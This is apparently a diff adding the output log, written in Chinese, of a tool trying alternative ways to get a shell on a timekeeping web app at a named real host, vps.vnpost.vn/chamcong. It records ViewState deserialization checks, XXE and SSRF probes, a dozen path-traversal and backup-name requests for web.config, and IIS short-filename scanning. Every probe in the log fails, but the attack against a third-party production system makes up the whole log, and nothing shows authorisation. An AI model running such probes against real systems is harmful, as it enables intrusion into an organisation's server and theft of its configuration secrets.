@@ -1,0 +1,64 @@
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🎯 Chamcong替代GetShell方法
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[1] ViewState反序列化攻击
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ASP.NET ViewState可能存在反序列化漏洞...
+
+ViewState样本:
+/wEPDwULLTE4MzUzOTEyODUPZBYCAgMPZBYMAgEPDxYCHgRUZXh0BSZN4bqqVSBCSeG7glUgTkjhuqxQIFPhu5AgQ0hVWeG6vk4g
+
+测试MAC验证...
+  ❌ 启用了MAC验证（难以利用）
+
+[2] XXE攻击（如果有XML端点）
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  测试: /api/data
+    响应: 1239 bytes
+
+  测试: /api/import
+    响应: 1239 bytes
+
+  测试: /api/upload
+    响应: 1239 bytes
+
+  测试: /webservice.asmx
+    响应: 3769 bytes
+
+[3] SSRF攻击（利用Export功能）
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+如果Export功能会加载外部资源，可能存在SSRF...
+
+  测试：尝试让服务器访问内网
+  测试UNC路径...
+  响应: 8063 bytes
+
+[4] 尝试读取web.config（多种方法）
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  http://vps.vnpost.vn/chamcong/web.config: 404
+  http://vps.vnpost.vn/chamcong/Web.config: 404
+  http://vps.vnpost.vn/chamcong/WEB.CONFIG: 404
+  http://vps.vnpost.vn/chamcongweb.config: 404
+  http://vps.vnpost.vn/chamcong\web.config: 404
+  http://vps.vnpost.vn/chamcong/web.config.txt: 404
+  http://vps.vnpost.vn/chamcong/web.config.bak: 404
+  http://vps.vnpost.vn/chamcong/web.config~: 404
+  http://vps.vnpost.vn/chamcong/web.config.old: 404
+  http://vps.vnpost.vn/chamcong/backup/web.config: 404
+  http://vps.vnpost.vn/chamcong/../web.config: 404
+  http://vps.vnpost.vn/chamcong/..\web.config: 404
+
+[5] IIS短文件名扫描
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+检测8.3短文件名泄露...
+
+  http://vps.vnpost.vn/chamcong/WEB~1.CON/web.config: 404
+  http://vps.vnpost.vn/chamcong/UPLOAD~1: 404
+  http://vps.vnpost.vn/chamcong/ADMIN~1: 404
+  http://vps.vnpost.vn/chamcong/CONFIG~1: 404
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+✅ 替代方法测试完成
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
